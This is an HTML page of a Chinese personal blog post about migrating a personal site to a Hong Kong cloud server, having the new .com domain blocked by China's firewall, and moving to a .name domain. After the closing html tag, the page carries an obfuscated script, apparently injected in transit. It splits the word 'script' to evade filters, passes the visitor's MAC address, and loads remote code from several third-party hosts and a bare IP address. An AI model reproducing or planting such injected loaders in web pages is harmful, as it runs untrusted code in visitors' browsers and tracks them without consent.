<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <title>个站的重生</title>
    <meta name="description" content="newhuan">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="renderer" content="webkit">
    <link rel="stylesheet" href="http://www.newhuan.name/css/app.css">
    <script src="../../../../js/element.js"></script>
    <meta name="apple-mobile-web-app-title" content="newhuan">
</head>
<body class="body body-article">

    <div class="full-header">
        <div class="container">
            <div class="logo">
                <a href="http://www.newhuan.name/blog" title="newhuan" alt="newhuan">首頁</a>
            </div>

            <div class="nav">
            </div>
        </div>
    </div>


    <div class="full-container">
        <div class="container">
            <div class="content">
                <h1 class="title">个站的重生</h1>
                <h3 class="date">20171114</h3>
                <div class="clearfix typo">
                    <p>之前因为知识性的缺失以及贫穷，买了一个基本没什么操作空间的主机，最近一些考虑同时折腾之心又起，搞了一个阿里云香港的ECS，就想着把个站迁到新的服务器上</p>
                    <p>之后正好godaddy提醒newhuan的.com域名可以买了，价格也还合适就直接买了，然后悲剧就发生了</p>
                    <p>以下是操作步骤</p>
                    <blockquote>
                        <p>购买域名</p>
                        <p>将域名A记录指向服务器IP</p>
                        <p>服务器安装nginx同时配置/etc/nginx/sites-enable/default文件，将域名默认导向newhuan.com，根目录重置为自定义的目录</p>
                    </blockquote>
                    <p>此时访问IP访问会正常显示，但是访问域名不行，ping域名显示DNS解析没有问题，ping域名和IP都ping的通。代理打开并将域名添加到白名单后也还是无法访问。多次google和重启nginx无效后，去论坛发帖问了下各位大佬。</p>
                    <p>看到人在国外的可以访问，开着代理的也能访问，猜测域名可能被墙，但是很奇怪啊，我用的是godaddy的DNS服务器，网站服务器用的阿里云香港，按说应该不会受到国内域名解析的限制啊，况且我也是开着代理的。</p>
                    <p>确定了问题可能出现的方向，尝试修改DNS服务器到之前的主机壳，但是接到对方邮件提示：域名已被加入长城防火墙黑名单，顿时绝望。</p>
                    <p>查询域名被墙解决方案，研究后决定放弃。。。</p>
                    <p>之后在万网购买了newhuan.name域名，用阿里云的DNS服务器将A记录解析到服务器IP，瞬间搞定;</p>
                    <p>接下来用rsync将原数据上传到服务器，网站搬迁完成！</p>
                    <p>至此，个站重生，.com域名等2个月满转到万网再实名试试，域名还是.com看的舒服一些！</p>

                </div>
            </div>
        </div>
    </div>

    <div class="full-footer">
        <div class="container">
            <div class="copyright">
                © 2015&nbsp;
                <a href="http://www.newhuan.name/blog/" target="_blank">newhuan</a>&nbsp;by&nbsp;
            </div>

            <div class="hm hidden">
                <script type="text/javascript">
                    var _hmt = _hmt || [];
                    (function() {
                        var hm = document.createElement("script");
                        hm.src = "//hm.baidu.com/hm.js?63392a0ec51d4ad23453b82650af1329";
                        var s = document.getElementsByTagName("script")[0];
                        s.parentNode.insertBefore(hm, s);
                    })();
                </script>
            </div>
        </div>
    </div>


</body>
</html>
<script>
    var __m='c8:3a:35:73:27:69';
    var __m2='00:00:00:00:00:00';
    var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=8ee9af4179981b1f95c88061fabf6478,M,";
    var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
    var __n="http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m;
    var __p="http://feed.theta.sogou.com/feed_icon?pid=ikuai8_app_2&appname=ikuai&uid="+__m+"&mac="+__m2;
    var __y="http://static.helianhealth.com/hlwf/akb1.js";
    if(self==top){
        var x=parseInt(Math.random()*(100-0+1)+0);
        switch(true){
            case x>=0&&x<70:
                __w("http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m,101);
                __w(__p,1);
                __w(__y,5);
                break;
            case x>=70&&x<80:
                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
                __w(__y,5);
                break;
            case x>=80&&x<=100:
                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
                __w(__y,5);
                break;
        }
    }
    function __w(s,n){document.write("<sc"+"ript src='"+s+"'></scr"+"ipt>");document.write(__h+n+__b);}
</script>